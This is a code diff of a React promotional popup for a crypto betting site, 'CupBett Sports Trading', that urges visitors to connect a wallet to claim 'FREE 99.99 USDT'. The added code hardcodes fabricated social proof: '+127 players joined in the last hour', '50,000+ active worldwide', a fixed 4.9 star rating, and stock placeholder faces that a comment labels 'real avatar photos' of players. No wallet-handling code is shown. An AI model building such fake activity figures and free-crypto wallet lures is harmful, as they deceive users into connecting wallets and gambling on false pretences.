@@ -1,30 +1,31 @@
 import { useEffect, useState, useRef } from 'react';
-import { X, Zap, Shield, Users, TrendingUp } from 'lucide-react';
+import { X, Zap, Shield, Users, TrendingUp, Star } from 'lucide-react';
 
-const PARTICLE_COUNT = 18;
+const PARTICLES = Array.from({ length: 20 }, (_, i) => ({
+  id: i,
+  x: Math.random() * 100,
+  y: Math.random() * 100,
+  size: Math.random() * 2.5 + 1.2,
+  delay: Math.random() * 5,
+  dur: Math.random() * 4 + 5,
+  op: Math.random() * 0.35 + 0.08,
+  gold: i < 7,
+}));
 
-function useParticles() {
-  return useRef(
-    Array.from({ length: PARTICLE_COUNT }, (_, i) => ({
-      id: i,
-      x: Math.random() * 100,
-      y: Math.random() * 100,
-      size: Math.random() * 3 + 1.5,
-      delay: Math.random() * 4,
-      duration: Math.random() * 4 + 5,
-      opacity: Math.random() * 0.4 + 0.1,
-    }))
-  ).current;
-}
+const AVATARS = [
+  'https://i.pravatar.cc/40?img=3',
+  'https://i.pravatar.cc/40?img=12',
+  'https://i.pravatar.cc/40?img=25',
+  'https://i.pravatar.cc/40?img=47',
+  'https://i.pravatar.cc/40?img=68',
+];
 
 export function PromoPopup() {
   const [visible, setVisible] = useState(false);
   const [closing, setClosing] = useState(false);
-  const particles = useParticles();
 
   useEffect(() => {
-    const alreadySeen = sessionStorage.getItem('cupbett_promo_seen');
-    if (alreadySeen) return;
+    if (sessionStorage.getItem('cupbett_promo_seen')) return;
     const t = setTimeout(() => setVisible(true), 8000);
     return () => clearTimeout(t);
   }, []);
@@ -35,7 +36,7 @@ export function PromoPopup() {
       setVisible(false);
       setClosing(false);
       sessionStorage.setItem('cupbett_promo_seen', '1');
-    }, 380);
+    }, 360);
   }
 
   function handleConnect() {
@@ -47,206 +48,224 @@ export function PromoPopup() {
 
   return (
     <div
-      className="fixed inset-0 z-[9999] flex items-center justify-center p-4"
-      style={{
-        animation: closing
-          ? 'promoBackdropOut 0.38s ease forwards'
-          : 'promoBackdropIn 0.4s ease forwards',
-      }}
+      className="fixed inset-0 z-[9999] flex items-center justify-center p-3 sm:p-4"
+      style={{ animation: closing ? 'pBdOut .36s ease forwards' : 'pBdIn .38s ease forwards' }}
     >
       {/* Backdrop */}
       <div
-        className="absolute inset-0 bg-black/75"
-        style={{ backdropFilter: 'blur(12px)', WebkitBackdropFilter: 'blur(12px)' }}
+        className="absolute inset-0 bg-black/80"
+        style={{ backdropFilter: 'blur(14px)', WebkitBackdropFilter: 'blur(14px)' }}
         onClick={close}
       />
 
-      {/* Floating particles */}
+      {/* Particles */}
       <div className="absolute inset-0 overflow-hidden pointer-events-none">
-        {particles.map(p => (
+        {PARTICLES.map(p => (
           <div
             key={p.id}
-            className="absolute rounded-full bg-[#00DFA9]"
+            className="absolute rounded-full"
             style={{
-              left: `${p.x}%`,
-              top: `${p.y}%`,
-              width: p.size,
-              height: p.size,
-              opacity: p.opacity,
-              animation: `promoFloat ${p.duration}s ${p.delay}s ease-in-out infinite alternate`,
-            }}
-          />
-        ))}
-        {/* Gold particles */}
-        {particles.slice(0, 6).map(p => (
-          <div
-            key={`g${p.id}`}
-            className="absolute rounded-full bg-[#FACC15]"
-            style={{
-              left: `${(p.x + 30) % 100}%`,
-              top: `${(p.y + 20) % 100}%`,
-              width: p.size * 0.7,
-              height: p.size * 0.7,
-              opacity: p.opacity * 0.6,
-              animation: `promoFloat ${p.duration + 2}s ${p.delay + 1}s ease-in-out infinite alternate`,
+              left: `${p.x}%`, top: `${p.y}%`,
+              width: p.size, height: p.size,
+              opacity: p.op,
+              background: p.gold ? '#FACC15' : '#00DFA9',
+              animation: `pFloat ${p.dur}s ${p.delay}s ease-in-out infinite alternate`,
             }}
           />
         ))}
       </div>
 
-      {/* Modal */}
+      {/* ── Modal ── */}
       <div
-        className="relative w-full max-w-[880px] rounded-2xl overflow-hidden flex flex-col md:flex-row shadow-[0_40px_120px_rgba(0,0,0,0.9)]"
+        className="relative w-full max-w-[860px] rounded-2xl overflow-hidden shadow-[0_40px_100px_rgba(0,0,0,0.95)]"
         style={{
-          background: 'linear-gradient(135deg, #0D1117 0%, #0B1620 50%, #0D1117 100%)',
-          border: '1px solid rgba(0,223,169,0.18)',
-          animation: closing
-            ? 'promoModalOut 0.38s cubic-bezier(0.4,0,1,1) forwards'
-            : 'promoModalIn 0.45s cubic-bezier(0.16,1,0.3,1) forwards',
-          maxHeight: '95vh',
+          background: 'linear-gradient(140deg,#0A0F16 0%,#0D1520 55%,#0A0F16 100%)',
+          border: '1px solid rgba(0,223,169,0.2)',
+          animation: closing ? 'pMOut .36s cubic-bezier(.4,0,1,1) forwards' : 'pMIn .44s cubic-bezier(.16,1,.3,1) forwards',
         }}
         onClick={e => e.stopPropagation()}
       >
-        {/* Top accent bar */}
-        <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-[#00DFA9] via-[#38BDF8] to-[#FACC15]" />
+        {/* Top bar */}
+        <div className="absolute top-0 inset-x-0 h-[2px] bg-gradient-to-r from-[#00DFA9] via-[#38BDF8] to-[#FACC15]" />
 
-        {/* Ambient glow blobs */}
-        <div className="absolute -top-20 -left-20 w-72 h-72 rounded-full pointer-events-none"
-          style={{ background: 'radial-gradient(circle, rgba(0,223,169,0.12) 0%, transparent 70%)' }} />
-        <div className="absolute -bottom-20 right-40 w-64 h-64 rounded-full pointer-events-none"
-          style={{ background: 'radial-gradient(circle, rgba(56,189,248,0.1) 0%, transparent 70%)' }} />
-        <div className="absolute top-10 right-20 w-48 h-48 rounded-full pointer-events-none"
-          style={{ background: 'radial-gradient(circle, rgba(250,204,21,0.07) 0%, transparent 70%)' }} />
+        {/* Glow blobs */}
+        <div className="absolute -top-24 -left-24 w-80 h-80 rounded-full pointer-events-none"
+          style={{ background: 'radial-gradient(circle,rgba(0,223,169,0.13) 0%,transparent 70%)' }} />
+        <div className="absolute -bottom-24 right-32 w-72 h-72 rounded-full pointer-events-none"
+          style={{ background: 'radial-gradient(circle,rgba(56,189,248,0.1) 0%,transparent 70%)' }} />
 
-        {/* ─── LEFT: Celebrity Image ─────────────────────────────── */}
-        <div className="relative w-full md:w-[42%] shrink-0 overflow-hidden"
-          style={{ minHeight: '220px' }}>
-          <img
-            src="https://media.ourwebprojects.pro/wp-content/uploads/2026/05/Promo-Banner.webp"
-            alt="CupBett Promo"
-            className="w-full h-full object-cover object-center"
-            style={{ minHeight: '220px', maxHeight: '520px' }}
-          />
-          {/* Overlay gradient blending into right panel */}
-          <div className="absolute inset-0"
+        {/* ── LAYOUT: row on md+, column on mobile ── */}
+        <div className="flex flex-col md:flex-row">
+
+          {/* ── LEFT: Image ── */}
+          <div
+            className="relative shrink-0 w-full md:w-[38%] flex items-end justify-center overflow-hidden"
             style={{
-              background: 'linear-gradient(to right, transparent 40%, rgba(13,17,23,0.85) 100%)',
-            }} />
-          {/* Bottom overlay for mobile */}
-          <div className="absolute inset-x-0 bottom-0 h-16 md:hidden"
-            style={{ background: 'linear-gradient(to top, #0D1117 0%, transparent 100%)' }} />
-
-          {/* Live badge */}
-          <div className="absolute top-4 left-4 flex items-center gap-1.5 bg-black/60 rounded-full px-3 py-1.5 border border-[#00DFA9]/30"
-            style={{ backdropFilter: 'blur(8px)' }}>
-            <span className="w-1.5 h-1.5 rounded-full bg-[#00DFA9] animate-pulse" />
-            <span className="text-[10px] font-bold text-[#00DFA9] tracking-widest uppercase">Live Promo</span>
-          </div>
-        </div>
-
-        {/* ─── RIGHT: Content ───────────────────────────────────── */}
-        <div className="relative flex flex-col justify-between flex-1 px-6 py-7 md:px-8 md:py-8">
-
-          {/* Close */}
-          <button
-            onClick={close}
-            className="absolute top-4 right-4 w-8 h-8 rounded-full flex items-center justify-center text-[#94A3B8] hover:text-[#F8FAFC] hover:bg-[#253241] transition-all duration-200 z-10"
+              background: 'linear-gradient(160deg,#0D1825 0%,#081018 100%)',
+              minHeight: '200px',
+            }}
           >
-            <X className="w-4 h-4" />
-          </button>
+            <img
+              src="https://media.ourwebprojects.pro/wp-content/uploads/2026/05/Promo-Banner.webp"
+              alt="CupBett Ambassador"
+              className="w-full h-full"
+              style={{
+                objectFit: 'contain',
+                objectPosition: 'bottom center',
+                maxHeight: '420px',
+                minHeight: '200px',
+                display: 'block',
+              }}
+            />
 
-          {/* USDT Badge */}
-          <div className="flex items-center gap-2 mb-4">
-            <div className="flex items-center gap-2 bg-[#FACC15]/10 border border-[#FACC15]/25 rounded-full px-3 py-1.5">
-              <span className="text-[13px] font-black text-[#FACC15]" style={{ animation: 'promoUsdtPulse 2s ease-in-out infinite' }}>
-                ✦ FREE 99.99 USDT BONUS
-              </span>
+            {/* Right-edge blend into content panel */}
+            <div className="absolute inset-y-0 right-0 w-16 pointer-events-none hidden md:block"
+              style={{ background: 'linear-gradient(to right,transparent,#0A0F16)' }} />
+            {/* Bottom blend for mobile */}
+            <div className="absolute inset-x-0 bottom-0 h-12 pointer-events-none md:hidden"
+              style={{ background: 'linear-gradient(to top,#0A0F16,transparent)' }} />
+
+            {/* LIVE badge */}
+            <div
+              className="absolute top-3 left-3 flex items-center gap-1.5 rounded-full px-2.5 py-1 border border-[#00DFA9]/30"
+              style={{ background: 'rgba(0,0,0,0.65)', backdropFilter: 'blur(8px)' }}
+            >
+              <span className="w-1.5 h-1.5 rounded-full bg-[#00DFA9] animate-pulse shrink-0" />
+              <span className="text-[9px] font-bold text-[#00DFA9] tracking-[0.12em] uppercase">Live Promo</span>
+            </div>
+
+            {/* Star rating overlay */}
+            <div
+              className="absolute bottom-3 left-3 flex items-center gap-1 rounded-full px-2.5 py-1 border border-[#FACC15]/20"
+              style={{ background: 'rgba(0,0,0,0.65)', backdropFilter: 'blur(8px)' }}
+            >
+              {[1,2,3,4,5].map(s => <Star key={s} className="w-2.5 h-2.5 fill-[#FACC15] text-[#FACC15]" />)}
+              <span className="text-[9px] text-[#FACC15] font-semibold ml-0.5">4.9</span>
             </div>
           </div>
 
-          {/* Headline */}
-          <div className="mb-4">
-            <h2 className="text-[22px] md:text-[28px] font-black text-[#F8FAFC] leading-tight mb-2">
+          {/* ── RIGHT: Content ── */}
+          <div className="relative flex flex-col flex-1 px-5 py-5 sm:px-7 sm:py-7">
+
+            {/* Close */}
+            <button
+              onClick={close}
+              className="absolute top-3 right-3 w-7 h-7 sm:w-8 sm:h-8 rounded-full flex items-center justify-center text-[#64748B] hover:text-[#F8FAFC] hover:bg-[#1E2A38] transition-all duration-150 z-10"
+            >
+              <X className="w-3.5 h-3.5" />
+            </button>
+
+            {/* Bonus pill */}
+            <div className="flex items-center mb-3">
+              <div
+                className="flex items-center gap-1.5 rounded-full px-3 py-1.5 border border-[#FACC15]/30"
+                style={{ background: 'rgba(250,204,21,0.08)', animation: 'pPillPulse 2.2s ease-in-out infinite' }}
+              >
+                <span className="text-[#FACC15] text-[11px]">✦</span>
+                <span className="text-[12px] font-black text-[#FACC15] tracking-wide">WELCOME BONUS — FREE 99.99 USDT</span>
+              </div>
+            </div>
+
+            {/* Headline */}
+            <h2 className="text-[19px] sm:text-[24px] font-black text-[#F8FAFC] leading-[1.2] mb-2">
               Connect Your Wallet &{' '}
-              <span style={{ background: 'linear-gradient(90deg, #00DFA9, #38BDF8)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>
+              <span style={{
+                background: 'linear-gradient(90deg,#00DFA9 0%,#38BDF8 100%)',
+                WebkitBackgroundClip: 'text',
+                WebkitTextFillColor: 'transparent',
+              }}>
                 Claim FREE
               </span>{' '}
               <span className="text-[#FACC15]">99.99 USDT</span>
             </h2>
-            <p className="text-[13px] md:text-[14px] text-[#94A3B8] leading-relaxed">
-              Join thousands of winning players on <span className="text-[#00DFA9] font-semibold">CupBett Sports Trading</span>. Instant deposits, real-time odds, provably fair.
-            </p>
-          </div>
 
-          {/* Live activity */}
-          <div className="flex items-center gap-2 mb-5">
-            <div className="flex -space-x-1.5">
-              {['#00DFA9', '#38BDF8', '#FACC15', '#AB9FF2', '#F6851B'].map((c, i) => (
-                <div key={i} className="w-6 h-6 rounded-full border-2 border-[#0D1117]"
-                  style={{ background: `radial-gradient(circle at 35% 35%, white, ${c})` }} />
+            <p className="text-[12px] sm:text-[13px] text-[#94A3B8] leading-relaxed mb-4">
+              Join thousands of winning players on{' '}
+              <span className="text-[#00DFA9] font-semibold">CupBett Sports Trading</span>.
+              Instant deposits · real-time odds · provably fair.
+            </p>
+
+            {/* Social proof — real avatar photos */}
+            <div className="flex items-center gap-2.5 mb-5 p-2.5 rounded-xl border border-[#1E2A38]"
+              style={{ background: 'rgba(18,24,32,0.7)' }}>
+              <div className="flex -space-x-2 shrink-0">
+                {AVATARS.map((src, i) => (
+                  <img
+                    key={i}
+                    src={src}
+                    alt="Player"
+                    className="w-7 h-7 rounded-full border-2 border-[#0A0F16] object-cover"
+                    style={{ zIndex: AVATARS.length - i }}
+                    onError={e => {
+                      (e.currentTarget as HTMLImageElement).style.display = 'none';
+                    }}
+                  />
+                ))}
+              </div>
+              <div className="min-w-0">
+                <div className="text-[12px] font-semibold text-[#F8FAFC]">
+                  <span className="text-[#00DFA9]">+127 players</span> joined in the last hour
+                </div>
+                <div className="text-[10px] text-[#94A3B8]">50,000+ active worldwide right now</div>
+              </div>
+            </div>
+
+            {/* CTAs */}
+            <div className="flex flex-col sm:flex-row gap-2.5 mb-5">
+              <button
+                onClick={handleConnect}
+                className="relative flex-1 flex items-center justify-center gap-2 py-3 px-5 rounded-xl font-bold text-[13px] sm:text-[14px] text-[#071210] overflow-hidden transition-transform duration-150 hover:scale-[1.02] active:scale-[0.98]"
+                style={{
+                  background: 'linear-gradient(135deg,#00DFA9 0%,#00C49A 100%)',
+                  boxShadow: '0 0 28px rgba(0,223,169,0.4),0 4px 14px rgba(0,0,0,0.5)',
+                  animation: 'pCTAPulse 2.6s ease-in-out infinite',
+                }}
+              >
+                <Zap className="w-4 h-4 shrink-0" />
+                Connect Wallet — Get 99.99 USDT
+                {/* shimmer */}
+                <div className="absolute inset-0 pointer-events-none"
+                  style={{ background: 'linear-gradient(108deg,transparent 38%,rgba(255,255,255,0.22) 50%,transparent 62%)', animation: 'pShimmer 2.6s ease-in-out infinite' }} />
+              </button>
+
+              <button
+                onClick={close}
+                className="sm:shrink-0 sm:px-5 py-3 rounded-xl font-medium text-[12px] text-[#64748B] hover:text-[#94A3B8] border border-[#1E2A38] hover:border-[#253241] hover:bg-[#121821] transition-all duration-150"
+              >
+                Maybe Later
+              </button>
+            </div>
+
+            {/* Trust badges */}
+            <div className="grid grid-cols-3 gap-2 pt-4 border-t border-[#1E2A38]">
+              {[
+                { icon: Users,      label: '50,000+',  sub: 'Active Players',       color: '#00DFA9' },
+                { icon: TrendingUp, label: 'Instant',  sub: 'Crypto Withdrawals',   color: '#38BDF8' },
+                { icon: Shield,     label: 'Provably', sub: 'Fair Experience',       color: '#FACC15' },
+              ].map(({ icon: Icon, label, sub, color }) => (
+                <div key={label} className="flex flex-col items-center gap-1 text-center">
+                  <div className="w-7 h-7 rounded-lg flex items-center justify-center"
+                    style={{ background: `${color}14`, border: `1px solid ${color}28` }}>
+                    <Icon className="w-3.5 h-3.5" style={{ color }} />
+                  </div>
+                  <span className="text-[11px] sm:text-[12px] font-bold text-[#E2E8F0] leading-none mt-0.5">{label}</span>
+                  <span className="text-[9px] sm:text-[10px] text-[#64748B] leading-tight">{sub}</span>
+                </div>
               ))}
             </div>
-            <span className="text-[12px] text-[#94A3B8]">
-              <span className="text-[#00DFA9] font-semibold">+127 players</span> joined in the last hour
-            </span>
-          </div>
-
-          {/* CTA Buttons */}
-          <div className="flex flex-col sm:flex-row gap-3 mb-6">
-            <button
-              onClick={handleConnect}
-              className="relative flex-1 flex items-center justify-center gap-2 py-3.5 px-6 rounded-xl font-bold text-[14px] text-[#0B0F14] overflow-hidden transition-all duration-200 hover:scale-[1.02] active:scale-[0.98]"
-              style={{
-                background: 'linear-gradient(135deg, #00DFA9 0%, #00C49A 100%)',
-                boxShadow: '0 0 32px rgba(0,223,169,0.45), 0 4px 16px rgba(0,0,0,0.4)',
-                animation: 'promoCTAPulse 2.5s ease-in-out infinite',
-              }}
-            >
-              <Zap className="w-4 h-4 shrink-0" />
-              Connect Wallet
-              {/* Shimmer */}
-              <div className="absolute inset-0 pointer-events-none"
-                style={{ background: 'linear-gradient(105deg, transparent 40%, rgba(255,255,255,0.25) 50%, transparent 60%)', animation: 'promoShimmer 2.5s ease-in-out infinite' }} />
-            </button>
-
-            <button
-              onClick={close}
-              className="flex-1 sm:flex-none sm:px-6 py-3.5 rounded-xl font-semibold text-[13px] text-[#94A3B8] hover:text-[#F8FAFC] border border-[#253241] hover:border-[#2E3D50] hover:bg-[#121821] transition-all duration-200"
-            >
-              Maybe Later
-            </button>
-          </div>
-
-          {/* Trust badges */}
-          <div className="grid grid-cols-3 gap-2 pt-4 border-t border-[#253241]/60">
-            {[
-              { icon: Users, label: '50,000+', sub: 'Active Players', color: '#00DFA9' },
-              { icon: TrendingUp, label: 'Instant', sub: 'Crypto Withdrawals', color: '#38BDF8' },
-              { icon: Shield, label: 'Provably', sub: 'Fair Experience', color: '#FACC15' },
-            ].map(({ icon: Icon, label, sub, color }) => (
-              <div key={label} className="flex flex-col items-center gap-1 text-center">
-                <div className="w-7 h-7 rounded-lg flex items-center justify-center mb-0.5"
-                  style={{ background: `${color}15`, border: `1px solid ${color}30` }}>
-                  <Icon className="w-3.5 h-3.5" style={{ color }} />
-                </div>
-                <span className="text-[11px] font-bold text-[#F8FAFC]">{label}</span>
-                <span className="text-[10px] text-[#94A3B8] leading-tight">{sub}</span>
-              </div>
-            ))}
           </div>
         </div>
       </div>
 
-      {/* Keyframe styles */}
       <style>{`
-        @keyframes promoBackdropIn  { from { opacity:0 } to { opacity:1 } }
-        @keyframes promoBackdropOut { from { opacity:1 } to { opacity:0 } }
-        @keyframes promoModalIn  { from { opacity:0; transform:scale(0.88) translateY(24px) } to { opacity:1; transform:scale(1) translateY(0) } }
-        @keyframes promoModalOut { from { opacity:1; transform:scale(1) translateY(0) } to { opacity:0; transform:scale(0.92) translateY(16px) } }
-        @keyframes promoFloat { from { transform:translateY(0px) } to { transform:translateY(-18px) } }
-        @keyframes promoUsdtPulse { 0%,100%{opacity:1} 50%{opacity:0.7} }
-        @keyframes promoCTAPulse  { 0%,100%{box-shadow:0 0 32px rgba(0,223,169,0.45),0 4px 16px rgba(0,0,0,0.4)} 50%{box-shadow:0 0 48px rgba(0,223,169,0.65),0 4px 20px rgba(0,0,0,0.4)} }
-        @keyframes promoShimmer   { 0%{transform:translateX(-100%)} 60%,100%{transform:translateX(100%)} }
+        @keyframes pBdIn    { from{opacity:0}          to{opacity:1} }
+        @keyframes pBdOut   { from{opacity:1}          to{opacity:0} }
+        @keyframes pMIn     { from{opacity:0;transform:scale(.86) translateY(22px)} to{opacity:1;transform:scale(1) translateY(0)} }
+        @keyframes pMOut    { from{opacity:1;transform:scale(1) translateY(0)} to{opacity:0;transform:scale(.93) translateY(14px)} }
+        @keyframes pFloat   { from{transform:translateY(0)}   to{transform:translateY(-16px)} }
+        @keyframes pPillPulse{ 0%,100%{opacity:1} 50%{opacity:.72} }
+        @keyframes pCTAPulse { 0%,100%{box-shadow:0 0 28px rgba(0,223,169,.4),0 4px 14px rgba(0,0,0,.5)} 50%{box-shadow:0 0 44px rgba(0,223,169,.62),0 4px 18px rgba(0,0,0,.5)} }
+        @keyframes pShimmer  { 0%{transform:translateX(-120%)} 60%,100%{transform:translateX(120%)} }
       `}</style>
     </div>
   );
